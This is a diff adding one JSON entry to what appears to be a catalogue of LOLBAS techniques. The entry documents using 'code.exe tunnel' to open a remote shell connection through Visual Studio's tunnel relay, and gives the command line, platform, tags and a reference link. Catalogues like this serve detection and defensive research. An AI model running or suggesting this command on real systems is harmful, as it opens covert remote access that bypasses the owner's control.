@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-code-exe-execute",
+  "name": "LOLBAS · code.exe (Execute)",
+  "command": "code.exe tunnel --accept-server-license-terms --name \"tunnel-name\"",
+  "description": "Starts a reverse PowerShell connection over global.rel.tunnels.api.visualstudio.com via websockets; command",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "code",
+    "execute"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/code/",
+  "upstream_id": "code.exe/Execute/0",
+  "category": "lolbas",
+  "subcategory": "execute",
+  "references": [
+    {
+      "title": "LOLBAS — code.exe",
+      "url": "https://lolbas-project.github.io/lolbas/code/"
+    }
+  ]
+}
